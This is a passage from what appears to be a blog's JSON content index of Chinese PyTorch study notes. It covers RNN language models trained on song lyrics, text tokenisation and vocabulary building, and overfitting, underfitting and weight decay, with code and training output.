不分开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开epoch 80, perplexity 1.000520, time 0.91 sec - 分开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开 - 不分开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开epoch 120, perplexity 1.000255, time 0.99 sec - 分开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开 - 不分开球我球我球我球我球我球我球我球我球我球我球我球我球我球我球我球我球我球我球我球我球我球我球我球我球我epoch 160, perplexity 1.000151, time 0.92 sec - 分开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开 - 不分开球我球我球我球我球我球我球我球我球我球我球我球我球我球我球我球我球我球我球我球我球我球我球我球我球我\n\n结果显示双向循环NN的方法在这里是不合适的。因为这里是生成式语言模型，双向也会带来更多的参数，所以效果未必会好。","thumbnail":"https://s2.ax1x.com/2020/02/22/3Q8P4s.jpg","plink":"https://yuyuoo.github.io/2020/02/23/pytorch笔记七：循环神经网络进阶/"},{"title":"pytorch笔记六：循环神经网络基础","date":"2020-02-17T02:19:05.000Z","date_formatted":{"ll":"Feb 17, 2020","L":"02/17/2020","MM-DD":"02-17"},"updated":"2020-03-07T06:41:15.945Z","content":"\n\n从零开始实现循环神经网络123456789import torchimport torch.nn as nnimport timeimport mathimport syssys.path.append(\"/home/kesci/input\")import d2l_jay9460 as d2l(corpus_indices, char_to_idx, idx_to_char, vocab_size) = d2l.load_data_jay_lyrics()device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')\n\none-hot向量我们需要将字符表示成向量，这里采用one-hot向量。假设词典大小是N，每次字符对应一个从0到N−1的唯一的索引，则该字符的向量是一个长度为N的向量，若字符的索引是i，则该向量的第i个位置为1，其他位置为0。下面分别展示了索引为0和2的one-hot向量，向量长度等于词典大小。\n12345678910def one_hot(x, n_class, dtype=torch.float32):    result = torch.zeros(x.shape[0], n_class, dtype=dtype, device=x.device)  # shape: (n, n_class)    result.scatter_(1, x.long().view(-1, 1), 1)  # result[i, x[i, 0]] = 1    return result    x = torch.tensor([0, 2])x_one_hot = one_hot(x, vocab_size)print(x_one_hot)print(x_one_hot.shape)print(x_one_hot.sum(axis=1))\n\n1234tensor([[1., 0., 0.,  ..., 0., 0., 0.],        [0., 0., 1.,  ..., 0., 0., 0.]])torch.Size([2, 1027])tensor([1., 1.])\n\nx是一个一维的向量，x的每个元素是一个字符的索引。n-class是字典的大小。dtype指定返回的向量的数值类型。假设x的长度是n，最后返回的向量就是n*n_class的矩阵。result.scatter_：x转换成n*1的向量，第一个参数1表示对result每行填充，依次取x[i,0]作为列坐标，i作为行坐标，将result[]的这个位置上改为1.123456def to_onehot(X, n_class):    return [one_hot(X[:, i], n_class) for i in range(X.shape[1])]X = torch.arange(10).view(2, 5)inputs = to_onehot(X, vocab_size)print(len(inputs), inputs[0].shape)\n\n15 torch.Size([2, 1027])\n\n这里的 vocab_size 是从之前写的d2l.load_data_jay_lyrics()直接拿过来的。初始化模型参数12345678910111213141516171819num_inputs, num_hiddens, num_outputs = vocab_size, 256, vocab_size# num_inputs: d# num_hiddens: h, 隐藏单元的个数是超参数# num_outputs: qdef get_params():    def _one(shape):        param = torch.zeros(shape, device=device, dtype=torch.float32)        nn.init.normal_(param, 0, 0.01)        return torch.nn.Parameter(param)    # 隐藏层参数    W_xh = _one((num_inputs, num_hiddens))    W_hh = _one((num_hiddens, num_hiddens))    b_h = torch.nn.Parameter(torch.zeros(num_hiddens, device=device))    # 输出层参数    W_hq = _one((num_hiddens, num_outputs))    b_q = torch.nn.Parameter(torch.zeros(num_outputs, device=device))    return (W_xh, W_hh, b_h, W_hq, b_q)\n\n对于 W_xh 、W_hh 、W_hq 进行随机初始化，对于 b_h 和 b_q 初始化为0定义模型函数rnn用循环的方式依次完成循环神经网络每个时间步的计算。\n12345678910def rnn(inputs, state, params):    # inputs和outputs皆为num_steps个形状为(batch_size, vocab_size)的矩阵    W_xh, W_hh, b_h, W_hq, b_q = params    H, = state    outputs = []    for X in inputs:        H = torch.tanh(torch.matmul(X, W_xh) + torch.matmul(H, W_hh) + b_h)        Y = torch.matmul(H, W_hq) + b_q        outputs.append(Y)    return outputs, (H,)\n\nstate 是一个元组，虽然这里只有一个状态，是隐藏状态，但后面lstm不止一个，方便代码复用。H 是各个时间步的隐藏状态。Y 是各个时间步的输出。要返回 H 是因为相邻采样中当前的 H 可作为下一个batch状态的初始值。构造并初始化模型的参数：\n12def init_rnn_state(batch_size, num_hiddens, device):    return (torch.zeros((batch_size, num_hiddens), device=device), )\n\nnum_hiddens 是隐藏单元的个数，也就是前面的h。返回的虽然是一个元组，但是只有一个元素，是长度为1，形状是batch_size* num_hiddens的矩阵，值都是0.1234567891011print(X.shape)print(num_hiddens)print(vocab_size)state = init_rnn_state(X.shape[0], num_hiddens, device)inputs = to_onehot(X.to(device), vocab_size)params = get_params()outputs, state_new = rnn(inputs, state, params)print(len(inputs), inputs[0].shape)print(len(outputs), outputs[0].shape)print(len(state), state[0].shape)print(len(state_new), state_new[0].shape)\n\n1234567torch.Size([2, 5])25610275 torch.Size([2, 1027])5 torch.Size([2, 1027])1 torch.Size([2, 256])1 torch.Size([2, 256])\n\n裁剪梯度循环神经网络中较容易出现梯度衰减或梯度爆炸，这会导致网络几乎无法训练。裁剪梯度（clip gradient）是一种应对梯度爆炸的方法。假设我们把所有模型参数的梯度拼接成一个向量 g，并设裁剪的阈值是θ。裁剪后的梯度\n\n的L2范数不超过θ。\n12345678def grad_clipping(params, theta, device):    norm = torch.tensor([0.0], device=device)    for param in params:        norm += (param.grad.data ** 2).sum()    norm = norm.sqrt().item()    if norm &gt; theta:\t#相除小于1        for param in params:            param.grad.data *= (theta / norm)\t#得到裁剪后的梯度。\n\nparams 是模型的参数，theta 是阈值。norm 是梯度的L2范数。定义预测函数以下函数基于前缀prefix（含有数个字符的字符串）来预测接下来的num_chars个字符。\n123456789101112131415def predict_rnn(prefix, num_chars, rnn, params, init_rnn_state,                num_hiddens, vocab_size, device, idx_to_char, char_to_idx):    state = init_rnn_state(1, num_hiddens, device)    output = [char_to_idx[prefix[0]]]   # output记录prefix加上预测的num_chars个字符    for t in range(num_chars + len(prefix) - 1):        # 将上一时间步的输出作为当前时间步的输入        X = to_onehot(torch.tensor([[output[-1]]], device=device), vocab_size)        # 计算输出和更新隐藏状态        (Y, state) = rnn(X, state, params)        # 下一个时间步的输入是prefix里的字符或者当前的最佳预测字符        if t &lt; len(prefix) - 1:            output.append(char_to_idx[prefix[t + 1]])        else:            output.append(Y[0].argmax(dim=1).item())\t#把预测的Y这个字符的索引添加进output    return ''.join([idx_to_char[i] for i in output])\n\n我们先测试一下predict_rnn函数。我们将根据前缀“分开”创作长度为10个字符（不考虑前缀长度）的一段歌词。因为模型参数为随机值，所以预测结果也是随机的。\n12predict_rnn('分开', 10, rnn, params, init_rnn_state, num_hiddens, vocab_size,            device, idx_to_char, char_to_idx)\n\n1&#39;分开濡时食提危踢拆田唱母&#39;\n\n困惑度我们通常使用困惑度（perplexity）来评价语言模型的好坏。回忆一下softmax回归一节中交叉熵损失函数的定义。困惑度是对交叉熵损失函数做指数运算后得到的值。特别地，\n最佳情况下，模型总是把标签类别的概率预测为1，此时困惑度为1；最坏情况下，模型总是把标签类别的概率预测为0，此时困惑度为正无穷；基线情况下，模型总是预测所有类别的概率都相同，此时困惑度为类别个数。显然，任何一个有效模型的困惑度必须小于类别个数。在本例中，困惑度必须小于词典大小vocab_size。\n定义模型训练函数跟之前章节的模型训练函数相比，这里的模型训练函数有以下几点不同：\n使用困惑度评价模型。在迭代模型参数前裁剪梯度。对时序数据采用不同采样方法将导致隐藏状态初始化的不同。对于同一个epoch,随着batch_size的增大，模型损失函数关于隐藏变量的梯度传播得更远，计算开销也更大。为了减小计算开销，可以在每个batch开始的时候把隐藏状态从计算图中分离出来。\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051def train_and_predict_rnn(rnn, get_params, init_rnn_state, num_hiddens,                          vocab_size, device, corpus_indices, idx_to_char,                          char_to_idx, is_random_iter, num_epochs, num_steps,                          lr, clipping_theta, batch_size, pred_period,                          pred_len, prefixes):    if is_random_iter:        data_iter_fn = d2l.data_iter_random    else:        data_iter_fn = d2l.data_iter_consecutive    params = get_params()    loss = nn.CrossEntropyLoss()    for epoch in range(num_epochs):        if not is_random_iter:  # 如使用相邻采样，在epoch开始时初始化隐藏状态            state = init_rnn_state(batch_size, num_hiddens, device)        l_sum, n, start = 0.0, 0, time.time()        data_iter = data_iter_fn(corpus_indices, batch_size, num_steps, device)        for X, Y in data_iter:            if is_random_iter:  # 如使用随机采样，在每个小批量更新前初始化隐藏状态                state = init_rnn_state(batch_size, num_hiddens, device)            else:  # 否则需要使用detach函数从计算图分离隐藏状态                for s in state:                    s.detach_()            # inputs是num_steps个形状为(batch_size, vocab_size)的矩阵            inputs = to_onehot(X, vocab_size)            # outputs有num_steps个形状为(batch_size, vocab_size)的矩阵            (outputs, state) = rnn(inputs, state, params)            # 拼接之后形状为(num_steps * batch_size, vocab_size)            outputs = torch.cat(outputs, dim=0)            # Y的形状是(batch_size, num_steps)，转置后再变成形状为            # (num_steps * batch_size,)的向量，这样跟输出的行一一对应            y = torch.flatten(Y.T)            # 使用交叉熵损失计算平均分类误差            l = loss(outputs, y.long())                        # 梯度清0            if params[0].grad is not None:                for param in params:                    param.grad.data.zero_()            l.backward()            grad_clipping(params, clipping_theta, device)  # 裁剪梯度            d2l.sgd(params, lr, 1)  # 因为误差已经取过均值，梯度不用再做平均            l_sum += l.item() * y.shape[0]            n += y.shape[0]        if (epoch + 1) % pred_period == 0:            print('epoch %d, perplexity %f, time %.2f sec' % (                epoch + 1, math.exp(l_sum / n), time.time() - start))            for prefix in prefixes:                print(' -', predict_rnn(prefix, pred_len, rnn, params, init_rnn_state,                    num_hiddens, vocab_size, device, idx_to_char, char_to_idx))\n\n训练模型并创作歌词现在我们可以训练模型了。首先，设置模型超参数。我们将根据前缀“分开”和“不分开”分别创作长度为50个字符（不考虑前缀长度）的一段歌词。我们每过50个迭代周期便根据当前训练的模型创作一段歌词。\n12num_epochs, num_steps, batch_size, lr, clipping_theta = 250, 35, 32, 1e2, 1e-2pred_period, pred_len, prefixes = 50, 50, ['分开', '不分开']\n\n下面采用随机采样训练模型并创作歌词。\n12345train_and_predict_rnn(rnn, get_params, init_rnn_state, num_hiddens,                      vocab_size, device, corpus_indices, idx_to_char,                      char_to_idx, True, num_epochs, num_steps, lr,                      clipping_theta, batch_size, pred_period, pred_len,                      prefixes)\n\n结果太智障了就不贴在这里了。\n接下来采用相邻采样训练模型并创作歌词。\n12345train_and_predict_rnn(rnn, get_params, init_rnn_state, num_hiddens,                      vocab_size, device, corpus_indices, idx_to_char,                      char_to_idx, False, num_epochs, num_steps, lr,                      clipping_theta, batch_size, pred_period, pred_len,                      prefixes)\n\n循环神经网络的简洁实现定义模型我们使用Pytorch中的nn.RNN来构造循环神经网络。在本节中，我们主要关注nn.RNN的以下几个构造函数参数：\ninput_size - The number of expected features in the input xhidden_size – The number of features in the hidden state hnonlinearity – The non-linearity to use. Can be either &#39;tanh&#39; or &#39;relu&#39;. Default: &#39;tanh&#39;batch_first – If True, then the input and output tensors are provided as (batch_size, num_steps, input_size). Default: False这里的batch_first决定了输入的形状，我们使用默认的参数False，对应的输入形状是 (num_steps, batch_size, input_size)。\nforward函数的参数为：\ninput of shape (num_steps, batch_size, input_size): tensor containing the features of the input sequence.h_0 of shape (num_layers * num_directions, batch_size, hidden_size): tensor containing the initial hidden state for each element in the batch. Defaults to zero if not provided. If the RNN is bidirectional, num_directions should be 2, else it should be 1.forward函数的返回值是：\noutput of shape (num_steps, batch_size, num_directions * hidden_size): tensor containing the output features (h_t) from the last layer of the RNN, for each t.h_n of shape (num_layers * num_directions, batch_size, hidden_size): tensor containing the hidden state for t = num_steps.现在我们构造一个nn.RNN实例，并用一个简单的例子来看一下输出的形状。\n123456rnn_layer = nn.RNN(input_size=vocab_size, hidden_size=num_hiddens)num_steps, batch_size = 35, 2X = torch.rand(num_steps, batch_size, vocab_size)state = NoneY, state_new = rnn_layer(X, state)print(Y.shape, state_new.shape)\n\n1torch.Size([35, 2, 256]) torch.Size([1, 2, 256])\n\n我们定义一个完整的基于循环神经网络的语言模型。\n12345678910111213141516class RNNModel(nn.Module):    def __init__(self, rnn_layer, vocab_size):        super(RNNModel, self).__init__()        self.rnn = rnn_layer        self.hidden_size = rnn_layer.hidden_size * (2 if rnn_layer.bidirectional else 1)         self.vocab_size = vocab_size        self.dense = nn.Linear(self.hidden_size, vocab_size)    def forward(self, inputs, state):        # inputs.shape: (batch_size, num_steps)        X = to_onehot(inputs, vocab_size)        X = torch.stack(X)  # X.shape: (num_steps, batch_size, vocab_size)        hiddens, state = self.rnn(X, state)        hiddens = hiddens.view(-1, hiddens.shape[-1])  # hiddens.shape: (num_steps * batch_size, hidden_size)        output = self.dense(hiddens)        return output, state\n\n类似的，我们需要实现一个预测函数，与前面的区别在于前向计算和初始化隐藏状态。\n123456789101112def predict_rnn_pytorch(prefix, num_chars, model, vocab_size, device, idx_to_char,                      char_to_idx):    state = None    output = [char_to_idx[prefix[0]]]  # output记录prefix加上预测的num_chars个字符    for t in range(num_chars + len(prefix) - 1):        X = torch.tensor([output[-1]], device=device).view(1, 1)        (Y, state) = model(X, state)  # 前向计算不需要传入模型参数        if t &lt; len(prefix) - 1:            output.append(char_to_idx[prefix[t + 1]])        else:            output.append(Y.argmax(dim=1).item())    return ''.join([idx_to_char[i] for i in output])\n\n接下来实现训练函数，这里只使用了相邻采样。\n1234567891011121314151617181920212223242526272829303132333435363738def train_and_predict_rnn_pytorch(model, num_hiddens, vocab_size, device,                                corpus_indices, idx_to_char, char_to_idx,                                num_epochs, num_steps, lr, clipping_theta,                                batch_size, pred_period, pred_len, prefixes):    loss = nn.CrossEntropyLoss()    optimizer = torch.optim.Adam(model.parameters(), lr=lr)    model.to(device)    for epoch in range(num_epochs):        l_sum, n, start = 0.0, 0, time.time()        data_iter = d2l.data_iter_consecutive(corpus_indices, batch_size, num_steps, device) # 相邻采样        state = None        for X, Y in data_iter:            if state is not None:                # 使用detach函数从计算图分离隐藏状态                if isinstance (state, tuple): # LSTM, state:(h, c)                      state[0].detach_()                    state[1].detach_()                else:                     state.detach_()            (output, state) = model(X, state) # output.shape: (num_steps * batch_size, vocab_size)            y = torch.flatten(Y.T)            l = loss(output, y.long())                        optimizer.zero_grad()            l.backward()            grad_clipping(model.parameters(), clipping_theta, device)            optimizer.step()            l_sum += l.item() * y.shape[0]            n += y.shape[0]                if (epoch + 1) % pred_period == 0:            print('epoch %d, perplexity %f, time %.2f sec' % (                epoch + 1, math.exp(l_sum / n), time.time() - start))            for prefix in prefixes:                print(' -', predict_rnn_pytorch(                    prefix, pred_len, model, vocab_size, device, idx_to_char,                    char_to_idx))\n\n训练模型。\n123456num_epochs, batch_size, lr, clipping_theta = 250, 32, 1e-3, 1e-2pred_period, pred_len, prefixes = 50, 50, ['分开', '不分开']train_and_predict_rnn_pytorch(model, num_hiddens, vocab_size, device,                            corpus_indices, idx_to_char, char_to_idx,                            num_epochs, num_steps, lr, clipping_theta,                            batch_size, pred_period, pred_len, prefixes)\n\n结果也不贴了。\n","thumbnail":"https://i.loli.net/2020/02/17/B9PRbW5AlKhVrQy.png","plink":"https://yuyuoo.github.io/2020/02/17/pytorch笔记六：循环神经网络基础/"},{"title":"pytorch笔记五：文本预处理","date":"2020-02-16T03:03:52.000Z","date_formatted":{"ll":"Feb 16, 2020","L":"02/16/2020","MM-DD":"02-16"},"updated":"2020-03-07T06:41:04.675Z","content":"1. 读入文本1234567891011import collectionsimport redef read_time_machine():    with open('/home/kesci/input/timemachine7163/timemachine.txt', 'r') as f:        lines = [re.sub('[^a-z]+', ' ', line.strip().lower()) for line in f]    return lineslines = read_time_machine()print('# sentences %d' % len(lines))\t# sentences 3221\n\nre.sub(&#39;[^a-z]+&#39;, &#39; &#39;, line.strip().lower())：Python strip () 方法用于移除字符串头尾指定的字符（默认为空格或换行符）或字符序列。Python lower () 方法转换字符串中所有大写字符为小写。先去掉每一行头尾的空白字符，再把大写字母全部换成小写，再把所有非字母的字符以空格代替。2. 分词我们对每个句子进行分词，也就是将一个句子划分成若干个词（token），转换为一个词的序列。\n1234567891011def tokenize(sentences, token='word'):\t#缺省按word分割    \"\"\"Split sentences into word or char tokens\"\"\"    if token == 'word':        return [sentence.split(' ') for sentence in sentences]    elif token == 'char':\t#按字符分割        return [list(sentence) for sentence in sentences]    else:        print('ERROR: unkown token type '+token)tokens = tokenize(lines)tokens[0:2]\t#看前两行的分词结果\n\n1[['the', 'time', 'machine', 'by', 'h', 'g', 'wells', ''], ['']]\t#第二行本来就是空的\n\n3. 建立字典为了方便模型处理，我们需要将字符串转换为数字。因此我们需要先构建一个字典（vocabulary），将每个词映射到一个唯一的索引编号。\n12345678910111213141516171819202122232425262728293031323334class Vocab(object):    def __init__(self, tokens, min_freq=0, use_special_tokens=False):        counter = count_corpus(tokens)  # &lt;key,value&gt;:&lt;词，词频&gt;         self.token_freqs = list(counter.items())        self.idx_to_token = []        if use_special_tokens:            # padding, begin of sentence, end of sentence, unknown            self.pad, self.bos, self.eos, self.unk = (0, 1, 2, 3)            self.idx_to_token += ['pad', 'bos', 'eos', 'unk']        else:            self.unk = 0            self.idx_to_token += ['unk']        self.idx_to_token += [token for token, freq in self.token_freqs                        if freq &gt;= min_freq and token not in self.idx_to_token]        self.token_to_idx = dict()        for idx, token in enumerate(self.idx_to_token):            self.token_to_idx[token] = idx    def __len__(self):        return len(self.idx_to_token)    def __getitem__(self, tokens):\t#给定词返回索引        if not isinstance(tokens, (list, tuple)):            return self.token_to_idx.get(tokens, self.unk)        return [self.__getitem__(token) for token in tokens]    def to_tokens(self, indices):\t#给定索引返回词        if not isinstance(indices, (list, tuple)):            return self.idx_to_token[indices]        return [self.idx_to_token[index] for index in indices]def count_corpus(sentences):    tokens = [tk for st in sentences for tk in st]    return collections.Counter(tokens)  # 返回一个字典，记录每个词的出现次数\n\n定义count_corpus()函数，collections.Counter(tokens)自动实现去重和记录单词出现次数。if use_special_tokens：判断是否要使用特殊token。pad表示在短句后面加若干特殊的token，使得与最长的句子一样长；bos和eos是句子首尾的token；unk是测试中输入的新token不在语料库中。idx_to_token:这个列表本身就是索引到token的映射。看一个例子，这里我们尝试用Time Machine作为语料构建字典\n12vocab = Vocab(tokens)print(list(vocab.token_to_idx.items())[0:10])\t#看前十个键值对\n\n输出：\n1[(&#39;unk&#39;, 0), (&#39;the&#39;, 1), (&#39;time&#39;, 2), (&#39;machine&#39;, 3), (&#39;by&#39;, 4), (&#39;h&#39;, 5), (&#39;g&#39;, 6), (&#39;wells&#39;, 7), (&#39;&#39;, 8), (&#39;i&#39;, 9)]\n\n4. 用spaCy和NLTK进行分词我们前面介绍的分词方式非常简单，它至少有以下几个缺点:\n标点符号通常可以提供语义信息，但是我们的方法直接将其丢弃了类似“shouldn&#39;t&quot;, &quot;doesn&#39;t&quot;这样的词会被错误地处理类似&quot;Mr.&quot;, &quot;Dr.&quot;这样的词会被错误地处理下面是一个简单的例子：\n1text = \"Mr. Chen doesn't agree with my suggestion.\"\n\nspaCy:\n1234import spacynlp = spacy.load('en_core_web_sm')doc = nlp(text)print([token.text for token in doc])\n\n1[&#39;Mr.&#39;, &#39;Chen&#39;, &#39;does&#39;, &quot;n&#39;t&quot;, &#39;agree&#39;, &#39;with&#39;, &#39;my&#39;, &#39;suggestion&#39;, &#39;.&#39;]\n\nNLTK:\n1234from nltk.tokenize import word_tokenizefrom nltk import datadata.path.append('/home/kesci/input/nltk_data3784/nltk_data')print(word_tokenize(text))\n\n1[&#39;Mr.&#39;, &#39;Chen&#39;, &#39;does&#39;, &quot;n&#39;t&quot;, &#39;agree&#39;, &#39;with&#39;, &#39;my&#39;, &#39;suggestion&#39;, &#39;.&#39;]","thumbnail":"https://s2.ax1x.com/2020/02/16/3ShyXF.png","plink":"https://yuyuoo.github.io/2020/02/16/pytorch笔记五：文本预处理/"},{"title":"pytorch笔记四：过拟合欠拟合及其解决方案","date":"2020-02-14T07:40:45.000Z","date_formatted":{"ll":"Feb 14, 2020","L":"02/14/2020","MM-DD":"02-14"},"updated":"2020-03-07T06:40:51.164Z","content":"1. 模型选择、过拟合和欠拟合训练误差和泛化误差在解释上述现象之前，我们需要区分训练误差（training error）和泛化误差（generalization error）。通俗来讲，前者指模型在训练数据集上表现出的误差，后者指模型在任意一个测试数据样本上表现出的误差的期望，并常常通过测试数据集上的误差来近似。计算训练误差和泛化误差可以使用之前介绍过的损失函数，例如线性回归用到的平方损失函数和softmax回归用到的交叉熵损失函数。\n机器学习模型应关注降低泛化误差。\n模型选择验证数据集从严格意义上讲，测试集只能在所有超参数和模型参数选定后使用一次。不可以使用测试数据选择模型，如调参。由于无法从训练误差估计泛化误差，因此也不应只依赖训练数据选择模型。鉴于此，我们可以预留一部分在训练数据集和测试数据集以外的数据来进行模型选择。这部分数据被称为验证数据集，简称验证集（validation set）。例如，我们可以从给定的训练集中随机选取一小部分作为验证集，而将剩余部分作为真正的训练集。\nK折交叉验证由于验证数据集不参与模型训练，当训练数据不够用时，预留大量的验证数据显得太奢侈。一种改善的方法是K折交叉验证（K-fold cross-validation）。在K折交叉验证中，我们把原始训练数据集分割成K个不重合的子数据集，然后我们做K次模型训练和验证。每一次，我们使用一个子数据集验证模型，并使用其他K-1个子数据集来训练模型。在这K次训练和验证中，每次用来验证模型的子数据集都不同。最后，我们对这K次训练误差和验证误差分别求平均。\n过拟合和欠拟合一类是模型无法得到较低的训练误差，我们将这一现象称作欠拟合（underfitting）；另一类是模型的训练误差远小于它在测试数据集上的误差，我们称该现象为过拟合（overfitting）。 在实践中，我们要尽可能同时应对欠拟合和过拟合。虽然有很多因素可能导致这两种拟合问题，在这里我们重点讨论两个因素：模型复杂度和训练数据集大小。模型复杂度\n训练数据集大小影响欠拟合和过拟合的另一个重要因素是训练数据集的大小。一般来说，如果训练数据集中样本数过少，特别是比模型参数数量（按元素计）更少时，过拟合更容易发生。此外，泛化误差不会随训练数据集里样本数量增加而增大。因此，在计算资源允许的范围之内，我们通常希望训练数据集大一些，特别是在模型复杂度较高时，例如层数较多的深度学习模型。\n2. 多项式函数拟合实验123456%matplotlib inlineimport torchimport numpy as npimport syssys.path.append(\"/home/kesci/input\")import d2lzh1981 as d2l\n\n初始化模型参数123456n_train, n_test, true_w, true_b = 100, 100, [1.2, -3.4, 5.6], 5features = torch.randn((n_train + n_test, 1))poly_features = torch.cat((features, torch.pow(features, 2), torch.pow(features, 3)), 1) labels = (true_w[0] * poly_features[:, 0] + true_w[1] * poly_features[:, 1]          + true_w[2] * poly_features[:, 2] + true_b)labels += torch.tensor(np.random.normal(0, 0.01, size=labels.size()), dtype=torch.float)\n\npoly_features是聚合的特征，将features看做 X ,poly_features就是 X , X 的平方，X 的三次方。torch.cat把这三个张量拼在一起，参数1表示按行拼（横着拼）。定义、训练和测试模型12345678910# 观察训练误差和泛化误差间的关系def semilogy(x_vals, y_vals, x_label, y_label, x2_vals=None, y2_vals=None,             legend=None, figsize=(3.5, 2.5)):    # d2l.set_figsize(figsize)    d2l.plt.xlabel(x_label)    d2l.plt.ylabel(y_label)    d2l.plt.semilogy(x_vals, y_vals)    if x2_vals and y2_vals:        d2l.plt.semilogy(x2_vals, y2_vals, linestyle=':')        d2l.plt.legend(legend)\n\n1234567891011121314151617181920212223242526272829num_epochs, loss = 100, torch.nn.MSELoss()def fit_and_plot(train_features, test_features, train_labels, test_labels):    # 初始化网络模型    net = torch.nn.Linear(train_features.shape[-1], 1)    # 通过Linear文档可知，pytorch已经将参数初始化了，所以我们这里就不手动初始化了        # 设置批量大小    batch_size = min(10, train_labels.shape[0])        dataset = torch.utils.data.TensorDataset(train_features, train_labels)      # 设置数据集    train_iter = torch.utils.data.DataLoader(dataset, batch_size, shuffle=True) # 设置获取数据方式        optimizer = torch.optim.SGD(net.parameters(), lr=0.01)                      # 设置优化函数，使用的是随机梯度下降优化    train_ls, test_ls = [], []    for _ in range(num_epochs):        for X, y in train_iter:                                                 # 取一个批量的数据            l = loss(net(X), y.view(-1, 1))                                     # 输入到网络中计算输出，并和标签比较求得损失函数            optimizer.zero_grad()                                               # 梯度清零，防止梯度累加干扰优化            l.backward()                                                        # 求梯度            optimizer.step()                                                    # 迭代优化函数，进行参数优化        train_labels = train_labels.view(-1, 1)        test_labels = test_labels.view(-1, 1)        train_ls.append(loss(net(train_features), train_labels).item())         # 将训练损失保存到train_ls中        test_ls.append(loss(net(test_features), test_labels).item())            # 将测试损失保存到test_ls中    print('final epoch: train loss', train_ls[-1], 'test loss', test_ls[-1])        semilogy(range(1, num_epochs + 1), train_ls, 'epochs', 'loss',             range(1, num_epochs + 1), test_ls, ['train', 'test'])    print('weight:', net.weight.data,          '\\nbias:', net.bias.data)\n\n三阶多项式函数拟合（正常）1fit_and_plot(poly_features[:n_train, :], poly_features[n_train:, :], labels[:n_train], labels[n_train:])\n\n输出：\n123final epoch: train loss 8.44636233523488e-05 test loss 0.00010286522592650726weight: tensor([[ 1.1989, -3.4000,  5.6007]]) bias: tensor([4.9991])\n\n\n线性函数拟合（欠拟合）1fit_and_plot(features[:n_train, :], features[n_train:, :], labels[:n_train], labels[n_train:])\n\n输出：\n123final epoch: train loss 144.07913208007812 test loss 66.60337829589844weight: tensor([[16.6699]]) bias: tensor([1.2409])\n\n\n训练样本不足（过拟合）1fit_and_plot(poly_features[0:2, :], poly_features[n_train:, :], labels[0:2], labels[n_train:])\n\n输出：\n123final epoch: train loss 0.3434029221534729 test loss 171.13600158691406weight: tensor([[ 0.7433,  0.4778, -0.0182]]) bias: tensor([4.3294])\n\n\n3. 权重衰减权重衰减等价于 L2 范数正则化（regularization）。正则化通过为模型损失函数添加惩罚项使学出的模型参数值较小，是应对过拟合的常用手段。\nL2 范数正则化（regularization）带有L2范数惩罚项的新损失函数为\n\n将线性回归一节中权重w1和w2的迭代方式更改为\n\n可见，L2范数正则化令权重 w1 和 w2 先自乘小于1的数，再减去不含惩罚项的梯度。因此，L2范数正则化又叫权重衰减。权重衰减通过惩罚绝对值较大的模型参数为需要学习的模型增加了限制，这可能对过拟合有效。\n高维线性回归实验从零开始的实现1234567%matplotlib inlineimport torchimport torch.nn as nnimport numpy as npimport syssys.path.append(\"/home/kesci/input\")import d2lzh1981 as d2l\n\n初始化模型参数维度是200，样本数20。\n12345678n_train, n_test, num_inputs = 20, 100, 200true_w, true_b = torch.ones(num_inputs, 1) * 0.01, 0.05features = torch.randn((n_train + n_test, num_inputs))labels = torch.matmul(features, true_w) + true_blabels += torch.tensor(np.random.normal(0, 0.01, size=labels.size()), dtype=torch.float)train_features, test_features = features[:n_train, :], features[n_train:, :]train_labels, test_labels = labels[:n_train], labels[n_train:]\n\n12345# 定义参数初始化函数，初始化模型参数并且附上梯度def init_params():    w = torch.randn((num_inputs, 1), requires_grad=True)    b = torch.zeros(1, requires_grad=True)    return [w, b]\n\n定义L2范数惩罚项123def l2_penalty(w):    return (w**2).sum() / 2#乘一个正数放到后面损失函数再写\n\n定义训练和测试12345678910111213141516171819202122232425batch_size, num_epochs, lr = 1, 100, 0.003net, loss = d2l.linreg, d2l.squared_lossdataset = torch.utils.data.TensorDataset(train_features, train_labels)train_iter = torch.utils.data.DataLoader(dataset, batch_size, shuffle=True)def fit_and_plot(lambd):    w, b = init_params()    train_ls, test_ls = [], []    for _ in range(num_epochs):        for X, y in train_iter:            # 添加了L2范数惩罚项            l = loss(net(X, w, b), y) + lambd * l2_penalty(w)            l = l.sum()                        if w.grad is not None:                w.grad.data.zero_()                b.grad.data.zero_()            l.backward()            d2l.sgd([w, b], lr, batch_size)        train_ls.append(loss(net(train_features, w, b), train_labels).mean().item())        test_ls.append(loss(net(test_features, w, b), test_labels).mean().item())    d2l.semilogy(range(1, num_epochs + 1), train_ls, 'epochs', 'loss',                 range(1, num_epochs + 1), test_ls, ['train', 'test'])    print('L2 norm of w:', w.norm().item())\n\nfit_and_plot(lambd)，lambd是人为定义的超参数，就是要乘的正数。l = loss(net(X, w, b), y) + lambd * l2_penalty(w) 求完损失要加L2范数惩罚项。观察过拟合12#lambd等于0就是不添加惩罚项fit_and_plot(lambd=0)\n\n\n使用权重衰减1fit_and_plot(lambd=3)\n\n\n简洁实现12345678910111213141516171819202122232425def fit_and_plot_pytorch(wd):    # 对权重参数衰减。权重名称一般是以weight结尾    net = nn.Linear(num_inputs, 1)    nn.init.normal_(net.weight, mean=0, std=1)    nn.init.normal_(net.bias, mean=0, std=1)    optimizer_w = torch.optim.SGD(params=[net.weight], lr=lr, weight_decay=wd) # 对权重参数衰减    optimizer_b = torch.optim.SGD(params=[net.bias], lr=lr)  # 不对偏差参数衰减        train_ls, test_ls = [], []    for _ in range(num_epochs):        for X, y in train_iter:            l = loss(net(X), y).mean()            optimizer_w.zero_grad()            optimizer_b.zero_grad()                        l.backward()                        # 对两个optimizer实例分别调用step函数，从而分别更新权重和偏差            optimizer_w.step()            optimizer_b.step()        train_ls.append(loss(net(train_features), train_labels).mean().item())        test_ls.append(loss(net(test_features), test_labels).mean().item())    d2l.semilogy(range(1, num_epochs + 1), train_ls, 'epochs', 'loss',                 range(1, num_epochs + 1), test_ls, ['train', 'test'])    print('L2 norm of w:', net.weight.data.norm().item())\n\n参数初始化直接使用nn.init优化函数直接使用torch.optim.SGD，设置weight_decay=wd启用权重衰减4. 